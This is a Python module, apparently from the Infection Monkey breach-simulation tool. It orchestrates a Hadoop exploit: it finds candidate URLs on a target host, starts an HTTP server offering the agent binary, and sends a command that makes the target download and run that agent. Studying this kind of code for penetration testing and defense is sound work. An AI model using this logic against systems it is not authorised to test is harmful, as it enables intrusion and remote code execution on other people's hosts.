import logging
from typing import Callable, Sequence

from common.types import Event
from infection_monkey.exploit.tools import HTTPBytesServer
from infection_monkey.exploit.tools.web_tools import build_urls
from infection_monkey.i_puppet import ExploiterResultData
from infection_monkey.model import TargetHost

from .hadoop_command_builder import build_hadoop_command
from .hadoop_exploit_client import HadoopExploitClient
from .hadoop_options import HadoopOptions

logger = logging.getLogger(__name__)

AgentBinaryServerFactory = Callable[[TargetHost], HTTPBytesServer]


class HadoopExploiter:
    def __init__(
        self,
        hadoop_exploit_client: HadoopExploitClient,
        start_agent_binary_server: AgentBinaryServerFactory,
    ):
        self._hadoop_exploit_client = hadoop_exploit_client
        self._start_agent_binary_server = start_agent_binary_server

    def exploit_host(
        self,
        target_host: TargetHost,
        servers: Sequence[str],
        current_depth: int,
        options: HadoopOptions,
        interrupt: Event,
    ) -> ExploiterResultData:

        # Try to get potential urls
        potential_urls = _build_potential_urls(target_host, options)
        if not potential_urls:
            msg = f"No potential URLs found for host: {target_host.ip}"
            logger.debug(msg)
            return ExploiterResultData(error_message=msg)

        try:
            agent_binary_http_server = self._start_agent_binary_server(target_host)
        except Exception as err:
            msg = (
                "An unexpected exception occurred while attempting to start the agent binary HTTP "
                f"server: {err}"
            )
            logger.exception(msg)
            return ExploiterResultData(error_message=msg)

        command = build_hadoop_command(
            target_host, servers, current_depth, agent_binary_http_server.download_url
        )

        try:
            return self._hadoop_exploit_client.exploit_urls(
                target_host,
                options,
                interrupt,
                potential_urls,
                command,
            )
        except Exception as err:
            msg = (
                "An unexpected exception occurred while attempting to exploit the host "
                f'"{target_host.ip}" with the Hadoop exploiter: {err}'
            )
            logger.exception(msg)
            return ExploiterResultData(error_message=msg)
        finally:
            _stop_agent_binary_http_server(
                agent_binary_http_server, options.agent_binary_download_timeout
            )


def _build_potential_urls(target_host: TargetHost, options: HadoopOptions) -> Sequence[str]:
    return build_urls(str(target_host.ip), [(str(p), False) for p in options.target_ports])


def _stop_agent_binary_http_server(
    agent_binary_http_server: HTTPBytesServer, agent_binary_download_timeout: float
):
    try:
        agent_binary_http_server.stop(agent_binary_download_timeout)
    except Exception:
        logger.exception("An unexpected error occurred while stopping the HTTP server")
